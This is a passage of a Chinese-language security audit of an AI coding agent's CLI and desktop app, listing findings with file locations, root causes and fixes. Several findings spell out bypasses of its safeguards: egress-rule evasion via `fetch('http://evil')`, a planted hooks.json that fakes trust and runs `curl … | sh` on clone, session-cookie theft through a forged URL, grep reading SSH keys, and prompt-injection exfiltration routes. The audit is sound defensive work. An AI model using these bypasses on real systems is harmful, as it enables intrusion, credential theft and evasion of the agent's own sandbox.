- **影响面**：生成继续、工具继续落盘；fetch/定时器钉住进程不退，第二次 Ctrl-C 无效。
- **建议修法**：两处均先遍历会话 `pendingAbort.abort()` 再 close。
- **是否当场可修**：是。

### F-067 编辑器审批请求无超时，prompt 可永久挂起

- **严重度**：P2
- **文件与行号**：`apps/cli/src/acp/server.ts:87-108`
- **触发路径**：编辑器不支持/不回复 `session/request_permission`。
- **根因**：只有 try/catch；SDK 侧 pending 只在收到响应或连接关闭时结算，无定时器。
- **影响面**：回合永不结束，面板"等待中"，只能杀进程。
- **建议修法**：超时（如 60s）后按 `cancelled`/deny 收口。
- **是否当场可修**：是。

### F-068 headless 封笔后仍追加事件行；`headless-permission` 兜底是死代码

- **严重度**：P2
- **文件与行号**：`apps/cli/src/index.ts:536-568`（558-560）；`apps/cli/src/headless-format.ts:183-208`；`apps/cli/src/headless-permission.ts:115-135`
- **触发路径**：`--json`/非 TTY 收尾时有后台任务超时或中断。
- **根因**：`runAgent` 先 `detachEvents` 并把 complete 作为最后一行，`finally` 又直接 stdout 写 `background_drain`，违反对"结果行之后不得再冒事件"的自述结构事实；`headless-permission` 全仓仅自引用，无消费点。
- **影响面**：NDJSON 严格消费方解析错位；宣称的 fail-closed 经纪为死代码，真实兜底散落在 tools 层。
- **建议修法**：drain 行走 stderr 或纳入同一闸；broker 接到 `executeToolCall` 的缺席分支。
- **是否当场可修**：是。

### F-071 更新计划 staged 目录用清单 name 拼接 → clone 写到 staging 之外且不清理

- **严重度**：P2
- **文件与行号**：`apps/cli/src/plugins/update-plan.ts:307-312,354-356,773`
- **触发路径**：`plugin-updates --plan-update` 对含恶意 name 的已装记录。
- **根因**：`path.join(stagingRoot, pluginName)` 无形状校验；`disposeStagingRoot` 仅在根内才删。
- **影响面**：`"../../x"` 使 clone 落在 `~/.ihui/update-staging` 之外（家目录）并留下残留目录；只读命令产生根外写副作用。
- **建议修法**：对 `pluginName` 过 F-069 的统一校验，并断言 `repoDir` 位于 `stagingRoot` 内。
- **是否当场可修**：是。

### F-076 出口取词缺口：裸 `localhost` 与解释器内 URL 视为无目标

- **严重度**：P2
- **文件与行号**：`apps/cli/src/sandbox/egress/dns-adjudicator.ts:66-96,218-243`；`apps/cli/src/sandbox/egress/bare-host.ts:83-90`；`apps/cli/src/sandbox/egress/env-inject.ts:203-205`
- **触发路径**：`curl localhost:8080`、`node -e "fetch('http://evil')"`、`curl -K cfg`。
- **根因**：只取 URL/四段 IP 字面量；裸主机强制含 `.`；零目标即 noop，不告警不拦。
- **影响面**：本机 admin 服务、配置/解释器驱动外联可绕过出口规则。
- **建议修法**：纳入 `name:port`；解释器/未知命令落 `unjudged` 并阻断。
- **是否当场可修**：是。

### F-077 DNS 判定与连接 TOCTOU / rebinding，默认无地址证据

- **严重度**：P2
- **文件与行号**：`apps/cli/src/sandbox/egress/dns-adjudicator.ts:176-210`；`apps/cli/src/sandbox/egress/builtin-rules.ts:47-53`；`apps/cli/src/sandbox/egress/env-inject.ts:131-137,157-182`
- **触发路径**：判定时解析到公网 → allow，子进程二次解析连内网；`127.0.0.1.nip.io` 无规则 → default-allow。
- **根因**：只产结论不钉 IP；默认 `allow`/`advisory`/`addressProof=false`。
- **影响面**：enforce 档同样可 SSRF、可打元数据端点。
- **建议修法**：判定后 DNS pinning 或强制代理；默认开 `addressProof`（需连接/代理层配合）。
- **是否当场可修**：否。

### F-078 出口台账可篡改、写失败静默放行

- **严重度**：P2
- **文件与行号**：`apps/cli/src/sandbox/egress/audit-ledger.ts:105-171`；`apps/cli/src/sandbox/egress/env-inject.ts:185-194`；`apps/cli/src/sandbox/index.ts:579-587`
- **触发路径**：子进程继承 `IHUI_EGRESS_AUDIT_LOG`，或状态目录可改写历史；写失败仅 warning。
- **根因**：明文追加、无哈希链/权限锚；审计与放行解耦。
- **影响面**：无法事后证明"当时拦没拦"，证据可被清空。
- **建议修法**：哈希链 + 单调 seq + 权限；写失败按策略阻断。
- **是否当场可修**：是。

### F-079 Windows `cmd.exe` 与 POSIX 分词错配

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tools/command-policy/tokenizer.ts:183-240,318-336`；`apps/cli/src/sandbox/index.ts:972,1120`
- **触发路径**：Windows 下 `type %USERPROFILE%\.env`、`r^m`。
- **根因**：分词只认 `$`/`\`，无 `%`/`^` 分支；`shell:true` 走 cmd 却按 POSIX 模型判定。
- **影响面**：Windows 上路径白名单与危险命令识别可绕。
- **建议修法**：按平台换 cmd 分词器，或禁用 shell 自行拼 argv。
- **是否当场可修**：是。

### F-081 `ensure_in_app_data` 对"末段悬空链接"与 canonicalize 失败 fail-open

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/lib.rs:1483-1531,1586-1589`
- **触发路径**：app_data 内预置指向外部的悬空 symlink/junction 后调 `write_text_file`。
- **根因**：`Path::exists()` 跟随链接 ⇒ 悬空链接判"不存在"，只 canonicalize **父**目录，末段链接未解析；`if let Ok(real)` / `if let Ok(real_ancestor)` / base 回退词法三处失败即放行。
- **影响面**：可在 app_data 外的任意可写位置新建文件。
- **建议修法**：用 `symlink_metadata` 判 reparse point 并拒绝；canonicalize 失败返回 Err。
- **是否当场可修**：部分。

### F-082 `clipboard_set` 图片解码无长度/像素上限

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/lib.rs:2463-2495`
- **触发路径**：`invoke("clipboard_set", { content: <base64>, format: "image" })`。
- **根因**：base64 解码后 `image::load_from_memory_with_format` 无限制，`into_raw()` 再复制一份 RGBA。
- **影响面**：数十 KB 的 PNG 炸弹（如 30000²）解码时分配数 GB ⇒ OOM/整窗卡死。
- **建议修法**：限制 base64 长度与总像素（≤64 MP），用 `image::io::Reader::with_limits`。
- **是否当场可修**：是。

### F-083 `clear_webview_cache` 主线程递归删且"没删也报成功"

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/lib.rs:1957-1994`
- **触发路径**：设置页点"清理缓存"。
- **根因**：非 async 命令在主线程逐目录 `remove_dir_all`；`LOCALAPPDATA` 缺失/目录不在时直接 `Ok(ok:true)`。
- **影响面**：UI 冻结；无删除仍显示成功。
- **建议修法**：改 async + `spawn_blocking`；返回真实删除数，`not_found` 明确报错。
- **是否当场可修**：是。

### F-089 `/memory search` 丢弃向量通道

- **严重度**：P2
- **文件与行号**：`apps/cli/src/commands/repl.ts:554,1300`；`apps/cli/src/memory/hybrid-search.ts:459-461,467`
- **触发路径**：配置 embedding key 后执行 `/memory search`。
- **根因**：`resolveEmbeddingProvider()` 造出真实 provider 并传入，但 `executeMemorySearch` 调 `hybridSearchSync`，其直接 `hybridSearchCore(opts, undefined, undefined)`；`hybridSearch` 无调用方。
- **影响面**：向量/语义检索永不生效，静默退化为 BM25+substring，用户无从得知，还白读密钥。
- **建议修法**：search 走 `await hybridSearch`，或给 sync 路径显式报"vector 未启用"。
- **是否当场可修**：是。

### F-090 压缩缓存键不含模型

- **严重度**：P2
- **文件与行号**：`apps/cli/src/compaction-cache.ts:45-47`；`apps/cli/src/commands/agent.ts:1660,1688,1701`
- **触发路径**：会话中切换模型（`--model`/config）后触发 88% 真压缩。
- **根因**：key = `sessionId|djb2(文本)`，模型与压缩版本均未入键；`sessionId` 缺省还是常量 `'cli-default'`；djb2 仅 32 位。
- **影响面**：旧模型摘要注入新模型上下文；摘要串味/格式不符，无告警。
- **建议修法**：key 加 `modelName+vendor`；哈希改 128 位。
- **是否当场可修**：是。

### F-092 TUI 转录无上限 + 每帧全量重排

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tui/fullscreen/transcript.ts:53-55,147`；`apps/cli/src/tui/fullscreen/app.ts:82-83,196`
- **触发路径**：长会话/大量工具输出后继续对话。
- **根因**：`blocks` 与 `assistant.text` 只 append 不裁剪；每次 paint 对全量 `blocksToLines + wrapTranscript`，每次按键又算一遍 `scrollTotal()`；节流只有 `setImmediate`。
- **影响面**：O(总字符) 每 token，长会话 CPU 飙升、输入卡顿；内存单向增长。
- **建议修法**：保留最近 N 块 + 总字符预算；缓存折行结果做增量。
- **是否当场可修**：是。

### F-094 `undo` 历史持久化仍是裸 `writeFileSync`，且 stale 检测读了不用

- **严重度**：P2
- **文件与行号**：`apps/cli/src/commands/undo-redo.ts:442-445,467,478`
- **触发路径**：执行 `ihui undo` / `redo` 写入历史文件时崩溃，或并发两实例。
- **根因**：同文件注释（442-445）明写"裸 `fs.writeFileSync` 必须退场——它与 `commitAtomicWrite` 是同…"；但 478 行仍是 `fs.writeFileSync(file, JSON.stringify(history, null, 2), 'utf-8')`；467 行读出的 `raw`（本应做 stale 冲突检测）被丢弃。
- **证据**：本次已复核 442-445（注释）、467（读）、478（裸写）。
- **影响面**：崩溃留半截 JSON ⇒ undo 历史全损；并发双写后写覆盖先写且无 stale 告警。
- **建议修法**：改走 `commitAtomicWrite`；把 467 的读结果真正用于 stale 检测或删掉该读。
- **是否当场可修**：是。

### F-040b 能力回归钉仍未接线（补充：本轮新增红点加剧）

- 已在 F-040 记录，本轮新增的 F-045/F-047/F-061 均属该三份 `capabilities-*.test.mjs` 的覆盖范围，说明"红灯存在但无人跑"。

### P3

### F-072 技能包配额在整包读入内存之后才生效

- **严重度**：P3
- **文件与行号**：`apps/cli/src/skills/packaging/verify.ts:295-297`；`apps/cli/src/skills/packaging/tar.ts:168-226`
- **触发路径**：`skill install` 指向超大 `.ihui-skill` 包。
- **根因**：`verifySkillPackage` 先 `fs.readFileSync(packagePath)` 全量入内存，`readTar` 的 512 MB/20000 条配额只能拦"展开后"。
- **影响面**：单文件即可打爆 CLI 内存；文档声称"物化之前"仅对条目成立。
- **建议修法**：read 前 `statSync().size` 按配额（或独立 `maxArchiveBytes`）先行拒绝。
- **是否当场可修**：是。

### F-084 异步命令体内做同步大 IO

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/src/lib.rs:1540-1552,1595-1626`
- **触发路径**：并发 `invoke` `read_text_file` / `list_dir`。
- **根因**：`async` 命令跑异步 runtime，却用 `std::fs` 同步调用（`read_to_string`、`read_dir` + 每项 `metadata`）。
- **影响面**：50 MB 读/大目录并发占满 worker，其他 IPC 排队。
- **建议修法**：包 `spawn_blocking`；`list_dir` 加条数上限。
- **是否当场可修**：是。

### F-085 设置落盘失败只记日志，仍返回成功

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/src/lib.rs:2162-2173,2305-2308,2332-2335`
- **触发路径**：磁盘满/配置目录只读时改偏好或托盘开关。
- **根因**：`save_desktop_prefs` 的 Err 只 log，命令返回 `DesktopPrefs`（非 Result）；`save_tray_settings` 仅 warn。
- **影响面**：前端显示已保存，重启全部回滚，失败无出口。
- **建议修法**：返回 `Result` 或 `persisted:false`（需前端契约同步）。
- **是否当场可修**：是。

### F-086 `save_window_state` 主线程同步写 + `lock().unwrap()`

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/src/lib.rs:1688-1700,1711-1727`
- **触发路径**：拖动/缩放窗口（约 300 ms 一次）。
- **根因**：非 async 命令内 `store.save()` 同步写 JSON；节流表的 `.lock().unwrap()` 同在事件回调。
- **影响面**：慢盘拖拽抖动；锁中毒即 panic。
- **建议修法**：异步落盘；`unwrap_or_else(|p| p.into_inner())`。
- **是否当场可修**：是。

### F-093 终端能力判定漏登 TERM 黑名单

- **严重度**：P3
- **文件与行号**：`apps/cli/src/tui/fullscreen/capability.ts:50-57`
- **触发路径**：Emacs `M-x term`（`TERM=eterm-color`）等无 alt-screen 终端里执行 `ihui tui`。
- **根因**：注释声明"排除 Emacs/VSCode 内置"，实际 `UNSUPPORTED_TERM_MARKERS=['dumb','unknown','cons25']`。
- **影响面**：误判 supported → 写 `\e[?1049h`/鼠标上报，出现乱码或空屏，退出后仍留转义残留。
- **建议修法**：补 `emacs`/`eterm`/`vscode` 标记，或改白名单。
- **是否当场可修**：是。

### 第 2 轮未判定

| ID | 事项 | 缺什么 |
|---|---|---|
| U-19 | ACP NDJSON 超长帧无上限（SDK `LineBuffer`，CLI 侧无限流） | 属 SDK 实现，需在 SDK 侧修 |
| U-20 | WS `?token=` 进 URL 是否被上游日志采集 | 需部署侧访问日志 |
| U-21 | `registry-client` 默认 `http://localhost:8802` 是否在生产被替换 | 需部署配置 |
| U-22 | 插件并发安装/回滚残竞态（`cache.ts:872-960`） | 需故障注入实测 |
| U-23 | `sandbox/escalate` 的 `humanApprovalMandated` 与确认串是否可伪造 | 仅静态读到互斥，无实测 |
| U-24 | `codegraph/persist.ts:88` 缓存非原子（损坏可 fallback，仅性能降级） | 是否值单列待定 |
| U-25 | `embedded_browser_*` 20 条命令的入参约束 | 第 3 轮跟进 |

### 第 2 轮去重说明

- `PROJECT_PLAN.md` 命中但不同题：租约接线（3035）、SSRF IPv6 缺口（3993）、读侧上限与 capability（31637-31640）、父目录 junction 残余/命令未登记（31711-31713）、G-832 写侧第二格、G-17/G-39、G-86（线上 WS 不可用，与本地 ws-bridge 无关）。
- `plan-fields.jsonl`：对本轮关键词 0 命中。
- 本轮 **30 条**为新增（F-062~F-095，含 1 条合并说明 F-040b）。

## 九、第 3 轮发现（续编号，5 个方向并行）

### P0

### F-096 钩子信任门可被配置文件字段自证绕过 → 克隆仓库即执行任意 shell

- **严重度**：P0
- **文件与行号**：`apps/cli/src/hooks/index.ts:741-745,777,1152-1157`
- **触发路径**：克隆一个含 `.ihui/hooks.json` 的仓库 → 触发 `preToolCall` → 执行。
- **根因**：`readHooksConfigBundle` 只做 `JSON.parse` 后 `parsed as unknown as HooksConfig`（777，本次已复核），**无字段白名单**；`stampConfigSource` 对已带 `source` 的条目**不覆盖**（`source: e.source ?? source`，743，本次已复核）；`hookTrustSkipReason` 见 `entry.source === 'user'` 直接 `return null`（1154，本次已复核）——即"跳过信任门"。
- **证据**：`stamped[key] = entries.map((e) => ({ ...e, source: e.source ?? source, sourceFolder: e.sourceFolder ?? sourceFolder }))`；`if (entry.source === 'user') return null;`。
- **影响面**：仓库内容是不可信输入；攻击者在 `hooks.json` 每条钩子里写 `"source":"user"` 即绕过信任审批，配合 `command:"curl … | sh"` 实现克隆即 RCE。信任体系整体失效。
- **建议修法**：加载层强制**覆写** `source`（不接受来自文件的该字段），`sourceFolder` 必须等于配置文件所在目录，并用白名单 schema 只取 `name/command/matchTool/...`。
- **是否当场可修**：是。

### P1

### F-097 钩子派发非全局，读取/子代理/MCP 类工具静默绕过

- **严重度**：P1
- **文件与行号**：`apps/cli/src/hooks/index.ts:17`；`apps/cli/src/tools/builtins.ts:649-758,1388,1412,1476`；`apps/cli/src/tools/subagent.ts`
- **触发路径**：配置 `preToolCall/postToolCall`（省略 `matchTool` 或指向 `read_file`/`list_dir`/`grep`/`glob`/`skill`/`dispatch_subagent`/MCP）。
- **根因**：派发点由约 20 个工具模块手写 opt-in，不在统一 `executeToolCall` 处；`read_file`（649-758）全文无 hook 调用，子代理与 MCP 均无 hook import，全 src 无集中派发。
- **影响面**：用户以为的"全工具/读取/子代理"门禁不存在；读密钥、起子代理完全不被审计。
- **建议修法**：在 `tools/index.ts` 统一执行入口按注册工具名派发，移除各工具体内重复调用。
- **是否当场可修**：是（中改）。

### F-098 子代理网络与资源限制字段无生产写入方，防护是死代码

- **严重度**：P1
- **文件与行号**：`apps/cli/src/subagents/worker-pool.ts:770,939-940,1569`；`apps/cli/src/subagents/worker-entry.ts:190`
- **触发路径**：`dispatch_subagent` 起 worker。
- **根因**：`this.config.networkEgressPolicy` / `resourceLimits` 恒为 `undefined` ⇒ `worker-entry` 跳过 `installEgressGuard`，fork 也不设堆限制；全仓 grep 只有 `worker-pool.ts:227,939` 与 `worker-entry.ts:190` 出现这两个字段，**无任何赋值**；`defaultWorkerPoolConfig` 只填 `maxWorkers`；fork 仍 `{...process.env}`。
- **影响面**：子代理 bash/fetch 不受声明出站白名单约束且继承父环境，提示注入可外带仓库内容。
- **建议修法**：从设置解析 policy/resourceLimits 注入默认配置并补用例。
- **是否当场可修**：是（中改）。

### F-099 qoder/workbuddy 隔离区恢复缺确认闸且信任 manifest 根/相对路径

- **严重度**：P1
- **文件与行号**：`apps/desktop/src-tauri/src/qoder_reset.rs:1057-1078,1281-1289`；`apps/desktop/src-tauri/src/workbuddy_reset.rs:887-912,1202-1210`
- **触发路径**：前端传 `quarantine_path` → `*_quarantine_restore` → 解析 manifest → `root.join(original_path)` → `create_dir_all(parent) + rename`。
- **根因**：只校验目录名 `.qoder-quarantine-<数字>` / `.workbuddy-quarantine-<数字>` 与 `root.parent().is_some()`，不 `canonicalize`、不校验 root 属于 cn/roaming、不拒 `..`/绝对路径；restore 命令**无** `require_native_confirm`（同文件 delete 有：`qoder:1296`、`workbuddy:1220`）。
- **影响面**：在用户可写处放一枚带 manifest 的目录，即可把文件搬到任意路径（如 Startup）形成持久化；与 F-053 同根但入口不同。
- **建议修法**：restore 复用 `expected_parents` + `canonicalize` 前缀校验 + 拒绝 `..`，并补确认闸。
- **是否当场可修**：是。

### F-100 内嵌页可伪造哨兵 URL → 导出 WorkBuddy 会话 Cookie

- **严重度**：P1
- **文件与行号**：`apps/desktop/src-tauri/src/embedded_browser.rs:659-668,930-951,1159-1183`；`checkin_web_login.rs:253-255`
- **触发路径**：任意第三方页在内嵌标签执行 `location.href='https://browser.ihui.invalid/wb-checkin-login'`（无 nonce、无来源校验，`on_navigation` 一律拦下并派发）。
- **根因**：Rust 取**该页 URL** 作 `return_base`（943-951），轮询共享 cookie jar 登录态成功后，把 `{"cookie":...}` 挂到 `return_base#wb_import=`（1164-1167）并导航回去（1182）；evil 页自身 JS 读 `location.hash` 即拿到完整会话 Cookie。
- **影响面**：凭据窃取（任意可被内嵌打开的站点）。
- **建议修法**：哨兵加 per-webview 随机 token；`return_base` 仅允许 `aizhs.top` 域，否则用常量兜底。
- **是否当场可修**：是。

### F-101 读侧 ACL 对子目录/越界 `.env` 失效

- **严重度**：P1
- **文件与行号**：`apps/cli/src/sandbox/file-access-policy.ts:84-97`；消费点 `apps/cli/src/tools/builtins.ts:657-670`；`file-access-policy.ts:502-508`
- **触发路径**：`read_file("apps/web/.env.local")` 或 `read_file("C:\\proj\\.env")`。
- **根因**：凭据规则只有锚定的 `.env` / `.env.*`，没有 `**/.env` 变体（同表 `**/.npmrc`、`**/*.pem` 都有递归形态）；`toAclPath` 对越界绝对路径原样回落；`*` 不跨 `/`。
- **证据**：实测 `globMatches("^\\.env$","apps/web/.env.local") = false`。
- **影响面**：工作区内任意层级、工作区外任意项目的 `.env` 可整份回灌模型。
- **建议修法**：补 `**/.env`、`**/.env.*`（置于例外族之后），越界绝对路径先做容器性拒绝。
- **是否当场可修**：是。

### F-102 `grep` 完全绕过读侧 ACL，且接受任意绝对路径

- **严重度**：P1
- **文件与行号**：`apps/cli/src/tools/builtins.ts:427-429,1009-1016,1069-1093`
- **触发路径**：`grep{pattern:".*", path:"C:\\Users\\x\\.ssh"}` 或 `path:"../other"`。
- **根因**：execute 内只 `fs.statSync` 后直接 rg / JS walk，全文无 `evaluateFileAccess`；`resolvePath` 放行绝对路径；JS 降级分支还会 `readFileSync` 整读。
- **影响面**：私钥/令牌正文可读出，绕开 `read_file` 的全部凭据规则。
- **建议修法**：入参先过 `checkPathReadPermission`，搜索根钳制在工作区内。
- **是否当场可修**：是。

### F-103 MCP stdio NDJSON 跨 chunk 帧被静默丢弃

- **严重度**：P1
- **文件与行号**：`apps/cli/src/tools/mcp-runtime.ts:377-379,404-435,1006`
- **触发路径**：一次 `tools/call` 返回 >64 KB 或含中文的大结果。
- **根因**：默认 ndjson 档每个 `data` 块独立 `toString() + split('\n')`，不保留残帧；`createStdioFrameDecoder` 只在 content-length 档启用；`JSON.parse` 失败即 `continue`（431），pending 表项无人结算，只能等 10s 超时。
- **影响面**：大结果 MCP 工具必假超时、反复重试；连接被误判死；中文被 chunk 边界切开产生 U+FFFD。
- **建议修法**：NDJSON 也改用 `createStdioFrameDecoder`（其 `pushNdjson` 已带残留缓冲）。
- **是否当场可修**：是。

### P2

### F-104 operator 审批可自批自跑

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/operator.rs:363-385,965-967,1014-1026`
- **触发路径**：本地 origin 页面先 `operator_decide`（返回值直接带 `plan_fingerprint`），再把同指纹 + 任意 `granted_by` 作为 `approval_json` 传给 `operator_execute`。
- **根因**：门只校验"指纹相等 + 非空签名"，无签名校验、无二次确认，等于调用方自批。
- **影响面**：任意本地页/XSS 可驱动真实键鼠、输入任意文本。
- **建议修法**：审批改由原生对话框签发票据（一次性 nonce + 进程内密钥）。
- **是否当场可修**：是（需产品确认）。

### F-105 桌面 egress_gate 判定与执行分离、默认 fail-open

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/egress_gate.rs:507-518,652-676,714-720`
- **触发路径**：设 `IHUI_EGRESS_DEFAULT=deny` 但未设 `IHUI_EGRESS_ENFORCE=1`。
- **根因**：全局 `enforcement` 默认 `Advisory`；`default-deny`/`internal-range` 用 `policy.enforcement` 结算，`guard` 仅在 `Enforce` 时返 Err；且全仓仅 5 个调用点，`tauri-plugin-http`（`lib.rs:3720`）与内嵌 WebView 完全不过门。
- **影响面**：策略形同虚设；设置面与实际拦截面不一致（伪开关）。
- **建议修法**：`default-deny` 一律 Enforce，或删除伪开关并文档化覆盖范围。
- **是否当场可修**：是。

### F-106 桌面 git 命令同步阻塞 + 输出无上限 + 只杀单进程

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/git_channel_ipc.rs:292-325,407-444,491-542`；`git_local_status.rs:227,251-263,272`
- **触发路径**：大仓/网络盘上 `git_workspace_status/diff/workspace_index_scan`。
- **根因**：非 async command，内部 `try_wait + thread::sleep(20ms)` 轮询至 15s；`workspace_index_scan` 无超时遍历整棵树；stdout `read_to_end` 全量读入（stderr 也是读完才截断），`MAX_REPORTED_ENTRIES` 仅在解析后判；超时仅 `child.kill()`，不杀 fsmonitor 等孙进程。
- **影响面**：窗口无响应、内存尖峰、孤儿进程。
- **建议修法**：改 async/`spawn_blocking`，管道限长读取，Windows 用 Job Object 杀树。
- **是否当场可修**：是。

### F-107 内嵌浏览器"元素点选"事件可被任意站点伪造

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/embedded_browser.rs:925-929`
- **触发路径**：任意页发 `/picked?d=<json>` → `emit_to("main")` → 主窗把 `text` 拼成 `[浏览器元素] …` 注入输入框。
- **根因**：事件无来源标记/tab token。
- **影响面**：外部页面可污染用户提示词、伪造引用（社工/提示注入）。
- **建议修法**：payload 带不可伪造 tab token，主窗校验。
- **是否当场可修**：是。

### F-108 深度重置按子串枚举注册表并整树删除

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/checkin_capture.rs:1726-1727,1770-1773,1819-1821`
- **触发路径**：深度重置 L11 枚举 `HKCU\Software`、`SOFTWARE`、`SOFTWARE\WOW6432Node`。
- **根因**：判据是 `name.contains("trae")`（含 icube/ahawork），非精确族名单，且直接 `RegDeleteTreeW` 不可逆。
- **影响面**：如 Traefik 或任意名含 `trae` 的软件整树被删；HKLM 侧同样。
- **建议修法**：精确名单/`Trae` 前缀 + 安装路径交叉校验。
- **是否当场可修**：是。

### F-109 Cookie 库副本以明文落 `%TEMP%` 且 pid 目录复用

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/checkin_capture.rs:528-530,601-624`
- **触发路径**：`checkin_capture_jwts` → `extract_cookie_jwts` → `temp_dir/ihui-checkin-<pid>/cookies-N.db`。
- **根因**：副本含明文 `value` 列 JWT（文件自身注释确认），无 ACL、无 finally 清理，仅按 pid 命名；并发两次调用互相 `remove_dir_all`。
- **影响面**：异常退出后明文凭据长期滞留 `%TEMP%`；并发探测间歇性 0 账号。
- **建议修法**：随机名 + RAII 清理 + 仅当前用户 ACL，或内存解密不落盘。
- **是否当场可修**：是。

### F-110 隔离动作计数失真（报告虚增）

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/qoder_reset.rs:500-519`
- **触发路径**：logout/factory → `execute_items`。
- **根因**：`q_layer_from(..., items.len())`（519）而 `acted` 仅 `let _ = acted`（518）；workbuddy 同构代码正确传 `acted`（`workbuddy_reset.rs:611`）。
- **影响面**：失败项也计入"已删除 N 项"，全失败时报告仍称已删 N 项 → 用户误判已重置、放弃回滚。
- **建议修法**：与 workbuddy 对齐传 `acted`。
- **是否当场可修**：是。

### F-111 身份账本非原子写 → 审计给出假"0 残留"

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/checkin_capture.rs:2542-2576,2837-2850`
- **触发路径**：重置前 `append_identity_history` 读改写；审计 `load_identity_blacklist`。
- **根因**：`fs::write` 直接截断写，失败留半份 JSON；解析失败静默返回空表，`audit_trae_residual` 走 `blacklist.is_empty()` 分支返回 `ok:true`。
- **影响面**：账本损坏即历史永久丢失，且审计结论变假阴性（fail-open）。
- **建议修法**：tmp+rename 原子写；损坏时明示错误而非空表。
- **是否当场可修**：是。

### F-112 `web_search` 只校验首跳且响应体无上限

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tools/web-search.ts:128,138-146,158`
- **触发路径**：302 指向内网；或对端返回超大 HTML。
- **根因**：仅对 `searchUrl` 调 `assertSafeFetchUrl`，随后 `redirect:'follow'`；`await res.text()` 无字节闸。同仓 `fetch-url.ts:133-178` 已改逐跳复校验 + 10 MiB 流式闸，本文件仍是旧形态。
- **影响面**：一次公网 302 即可把请求带进内网；大响应先全量进内存。
- **建议修法**：照搬 `fetch-url` 的逐跳循环与 `readBodyWithLimit`。
- **是否当场可修**：是。

### F-113 MCP http transport 不处理会话头与 SSE 响应

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tools/mcp-runtime.ts:568-593`
- **触发路径**：连接官方 Streamable HTTP server。
- **根因**：全文件无 `Mcp-Session-Id` 读写（grep 零命中），`Accept` 只给 `Content-Type`，一律 `resp.json()`，无大小上限。
- **影响面**：initialize 返回的 session 头被丢弃，后续请求 400；server 以 `text/event-stream` 回包时 `json()` 抛 SyntaxError ⇒ 合规 HTTP MCP server 结构上不可用；恶意 server 可撑爆内存。
- **建议修法**：保存并回传 session 头、`Accept: application/json, text/event-stream`、响应体加字节闸。
- **是否当场可修**：是（需少量协议改动）。

### F-114 `delete_file` 为算行数整份读文件

- **严重度**：P2
- **文件与行号**：`apps/cli/src/tools/file-edit.ts:544-550`
- **触发路径**：删除数 GB 日志/二进制。
- **根因**：`original = fs.readFileSync(abs, 'utf-8')` 仅为 `split('\n').length` 与 hunk 记录；`read_file` 有 512 KB 闸，此处无任何上限。
- **影响面**：删除大文件时 OOM；二进制被 utf-8 解码进内存。
- **建议修法**：用 `stat` 判大小，超限跳过 hunk 内容记录（行数置 1）。
- **是否当场可修**：是。

### F-115 `/config set` 把多源合并结果写回全局

- **严重度**：P2
- **文件与行号**：`apps/cli/src/commands/config-cmd.ts:267-273`；`apps/cli/src/config/settings.ts:399-400,470-472`
- **触发路径**：REPL `/config set locale en`。
- **根因**：`loadSettings()` 返回 cwd 三级 + home 三级（cursor < claude < ihui）的**合并值**，再整份 dump 回 `~/.ihui/settings.json`。
- **影响面**：仓库 `.ihui`/`.claude` 的 `defaultModel/sampler/maxIterations` 被固化进用户全局层，之后改 `~/.claude/settings.json` 不再生效。
- **建议修法**：以 `readSettingsObjectForUpdate` 返回的原文件对象做 RMW，只写目标键。
- **是否当场可修**：是。

### F-117 `tasks` 基线捕获时机错，丢更新/ID 冲突

- **严重度**：P2
- **文件与行号**：`apps/cli/src/commands/tasks.ts:136,191`
- **触发路径**：两终端同时 `/tasks add`。
- **根因**：`captureWriteBaseline(p)` 在 `loadStore` 与改内存**之后**才调用，比对的只是"捕获→rename"毫秒窗口；T0 读 → T1 捕获之间的他人写入被静默覆盖；`nextId` 同源。
- **影响面**：任务静默丢失；两任务同 id，`markDone` 只命中第一条。
- **建议修法**：`load` 时捕获基线并透传给 `saveStore`。
- **是否当场可修**：是。

### F-118 `sessionId` 未收敛，可读写任意 `.json`

- **严重度**：P2
- **文件与行号**：`apps/cli/src/commands/session.ts:56,75`；`apps/cli/src/index.ts:294,1195`；`apps/cli/src/acp/server.ts:607`
- **触发路径**：`ihui share ../../../../Users/x/secret`、`--resume`、ACP `session/load`。
- **根因**：`path.join(getSessionsDir(), `${id}.json`)` 零校验（本次已复核 56/75 行）；仓内 `util/path-guard.ts` 的 `safePathSegment`/`assertPathInside` 存在却未在此处使用（已在 `plan/structured.ts`、`runs/manifest.ts` 使用）。
- **影响面**：读任意可读 `.json` 并回传给 ACP 客户端；若被载文件 id 含 `..`，`loadSession → saveSession` 可写任意 `.json`。
- **建议修法**：加载/保存前 `safePathSegment` + `assertPathInside`。
- **是否当场可修**：是。

### F-119 `share` 的 `includeFiles=false` 是假保证

- **严重度**：P3
- **文件与行号**：`apps/cli/src/commands/share.ts:325,355-368`
- **触发路径**：`ihui share <id>`（默认 `includeToolCalls=true`）。
- **根因**：只对 ` ```tool_call ` 块做可选隐藏；`Tool Result:` 用户消息与 assistant 正文照常导出，`includeFiles` 仅追加一句"已省略"文案，不删任何内容。
- **影响面**：用户以为未含文件，实际快照含 `read_file` 结果/命令输出，落盘 `<ws>/.ihui-agent/shared`。
- **建议修法**：按工具名/消息类型真实过滤，或改名并显式告警。
- **是否当场可修**：是。

### F-120 `report` 覆盖无备份、输入无上限

- **严重度**：P3
- **文件与行号**：`apps/cli/src/commands/report.ts:103,140`
- **触发路径**：`ihui report agent-trace big.json --out existing.html`。
- **根因**：`readFileSync` + `JSON.parse` 无大小/条数上限；`writeFileSync` 直接覆盖已存在文件，无 exists 检查/备份/原子写。
- **影响面**：大文件 OOM；误覆盖同名报告。
